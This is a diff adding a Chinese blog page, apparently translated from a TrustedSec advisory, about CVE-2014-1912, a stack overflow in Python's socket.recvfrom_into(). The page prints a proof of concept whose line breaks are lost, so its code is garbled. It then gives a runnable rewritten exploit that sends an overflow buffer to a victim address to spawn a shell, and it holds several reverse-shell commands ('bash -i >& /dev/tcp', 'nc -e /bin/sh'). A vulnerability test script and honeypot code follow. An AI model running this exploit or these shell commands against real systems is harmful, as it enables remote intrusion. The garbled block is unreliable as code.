@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>Python socket.recvfrom_info()函数中的远程代码执行漏洞</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>Python socket.recvfrom_info()函数中的远程代码执行漏洞</h2>
+	<p class="meta">2014-03-10</p>
+
+	<div class="post">
+	        <p></p>
+<p>最近，pastebin上发布了一个<a href="http://pastebin.com/raw.php?i=GHXSmNEg" target="_blank" title="" data_ue_src="http://pastebin.com/raw.php?i=GHXSmNEg">exploit</a>，是关于Python 2.7和3.x版本中的socket.recvfrom_into()函数中一个远程代码执行漏洞（栈溢出）的PoC。</p>
+<p>（有些地方pastebin.com可能被墙了，为了方便，译者把它拷贝到文章里。）原exploit如下：</p>
+<pre class="prettyprint lang-python">#!/usr/bin/env python'''
+# Exploit Title: python socket.recvfrom_into() remote buffer overflow
+# Date: 21/02/2014
+# Exploit Author: @sha0coder
+# Vendor Homepage: python.org
+# Version: python2.7 and python3
+# Tested on: linux 32bit + python2.7
+# CVE : CVE-2014-1912
+
+socket.recvfrom_into() remote buffer overflow Proof of concept
+by @sha0coder
+
+With NX evasion!
+
+(gdb) x/i $eip
+=&gt; 0x817bb28:	mov    eax,DWORD PTR [ebx+0x4]       &lt;--- ebx full control =&gt; eax full conrol
+   0x817bb2b:	test   BYTE PTR [eax+0x55],0x40
+   0x817bb2f:	jne    0x817bb38 --&gt;
+   ...
+   0x817bb38:	mov    eax,DWORD PTR [eax+0xa4]      &lt;--- eax full control again
+   0x817bb3e:	test   eax,eax
+   0x817bb40:	jne    0x817bb58 --&gt;
+   ...
+   0x817bb58:	mov    DWORD PTR [esp],ebx  &lt;---- ebx points to the beginning of the buffer   [trash]||shell cmd[null byte]
+   0x817bb5b:	call   eax &lt;----- indirect fucktion call ;) will be redirected to system()
+
+'''import structdef off(o):
+	return struct.pack('L',o)'''
+rop = {
+	'pop eax': off(0x80795ac),
+	'call eax': off(0x817bb5b),
+	'xor eax': off(0x8061379),
+	'mov [eax], edx': off(0x8078cf6),
+	'xor edx, edx': off(0x80a60d1),
+}
+'''plt = {
+	'system': off(0x805b7e0),}#addr2null = off(0x11111111)ebx = 0xb7ae7908  # points to the begining of the buff eax = ebx
+eax2 = ebx+20padd2 = 'X'*(144)padd1 = 'Y'*(8)  #system_command = 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1'#system_command = 'nc -e /bin/sh 127.0.0.1 1337'system_command = 'ncat -e /bin/sh 127.0.0.1 1337''''           
+        +------------+------------------+                      +--------------------+
+        |            |                  |                      |                    |
+        V            |                  |                      |                    V         
+'''buff = 'aaaa' + off(eax) + padd1 + off(ebx) + padd2 +  plt['system'] + '||'+system_command+'\x00' # thanks python strings ;)print 'buf</pre>
+<p>该exploit发布于一月份，并且当时就已经被修复了（<a href="http://bugs.python.org/issue20246" target="_blank" title="" data_ue_src="http://bugs.python.org/issue20246" textvalue="http://bugs.python.org/issue20246">http://bugs.python.org/issue20246</a>）。不过这里要说的是，虽然我们的<a href="https://github.com/trustedsec/artillery" target="_blank" title="" data_ue_src="https://github.com/trustedsec/artillery" textvalue="Artillery">Artillery</a>用Python编写，而且用到了Python的SocketServer()函数，而SocketServer()函数又用到了Python中的socket模块，但幸运的是，Artillery并没有被这次的漏洞波及，纠其原因还是在于Artillery的设计。在创建Artillery时我们实际上并没有打算用它来接收任何数据，只是accept一个socket连接，之后通过该连接发送数据。</p>
+<p>Artillery 中的相关代码如下:</p>
+<p>(<a href="https://github.com/trustedsec/artillery/blob/master/src/honeypot.py" target="_blank" title="" data_ue_src="https://github.com/trustedsec/artillery/blob/master/src/honeypot.py" textvalue="https://github.com/trustedsec/artillery/blob/master/src/honeypot.py">https://github.com/trustedsec/artillery/blob/master/src/honeypot.py</a>)</p>
+<pre class="prettyprint lang-python">def setup(self):
+        # hehe send random length garbage to the attacker
+        length = random.randint(5, 30000)
+        # fake_string = random number between 5 and 30,000 then os.urandom the command back
+        fake_string = os.urandom(int(length))
+        # try the actual sending and banning
+        try:
+            self.request.send(fake_string)
+           #####  &lt;snipped some of the non-relevant code here&gt; #####
+            self.request.close()</pre>
+<p>如你所见，我们基于(5,30000)生成了一个随机字符串，通过连接发送出去，之后断开连接，并没有实际接收数据，因此也没有调用过socket.recvfrom_into()函数。通过分析SocketServer()函数可以发现，这个函数甚至根本没用到socket.recvfrom_into()函数，因此Artillery才没有被这次的漏洞波及。将该程序设计为从来不从攻击者那里接收数据，是基于其特殊的应用场景，使其从根本上杜绝了因socket或SocketServer的问题而产生的漏洞。</p>
+<p>原exploit有些问题，以下是根据该PoC重写的RCE版本（需要注意的是，代码中的rop变量没有整合到重写的exploit中，读者可以通过修改buff变量将该NX bypass合并进来）:</p>
+<pre class="prettyprint lang-python">import struct
+import socket
+import sys
+
+def off(o):
+        return struct.pack('L',o)
+
+''' 
+rop = {
+        'pop eax': off(0x80795ac),
+        'call eax': off(0x817bb5b),
+        'xor eax': off(0x8061379),
+        'mov [eax], edx': off(0x8078cf6),
+        'xor edx, edx': off(0x80a60d1),
+}
+'''
+
+plt = {
+        'system': off(0x805b7e0),
+}
+
+#addr2null = off(0x11111111)
+
+ebx = 0xb7ae7908 
+eax = ebx
+eax2 = ebx+20
+padd2 = 'X'*(144)
+padd1 = 'Y'*(8)
+
+system_command = 'bash -i &gt;&amp; /dev/tcp/0.0.0.0/1337 0&gt;&amp;1'
+
+buff = 'aaaa' + off(eax) + padd1 + off(ebx) + padd2 +  plt['system'] + '||'+system_command+'\x00'
+
+try:
+	ip = sys.argv[1]
+	port = int(sys.argv[2])
+	print "[*] Python 2.x/3.x Remote Code Execution in socket.recvfrom_into() based on PoC from @sha0coder - all credit to him."
+	print "[*] Quick rewrite: Dave Kennedy @ TrustedSec"
+	print "[*] Sending the exploit to %s on port %s" 
+	print "[*] If successful, a shell will be listening on port 1337 on the remote victim"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((ip, port))
+	# data = s.recv(512)
+	s.send(buff)
+	s.close()
+
+except IndexError:
+	print "Python 2.x/3.x Remote Code Execution (NX bypass) in socket.recvfrom_into() based on PoC from @sha0coder - all credit to him"
+	print "Quick rewrite by: Dave Kennedy @ TrustedSec"
+	print "Usage: python exploit.py &lt;victim_ipaddress&gt; &lt;victim_port&gt;"</pre>
+<p>代码就是这样的。尽管recvfrom_into()函数较少使用，但仍存在风险，因为也许恰好很多应用程序都使用了这个函数。感谢@sha0coder写了这么棒的PoC。如果读者要测试正在使用的Python版本是否存在该漏洞，可以创建一个简单的test.py脚本，输入以下内容：</p>
+<pre class="prettyprint lang-python">import socket
+r, w = socket.socketpair()
+w.send(b'X' * 1024)
+r.recvfrom_into(bytearray(), 1024)</pre>
+<p>在命令行运行 python test.py，如果返回Segmentation fault，那么恭喜你中枪了，赶紧更新你的Python吧！</p>
+<p>[via <a href="https://www.trustedsec.com/february-2014/python-remote-code-execution-socket-recvfrom_into/" target="_blank" title="" data_ue_src="https://www.trustedsec.com/february-2014/python-remote-code-execution-socket-recvfrom_into/" textvalue="trustedsec">trustedsec</a>]</p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
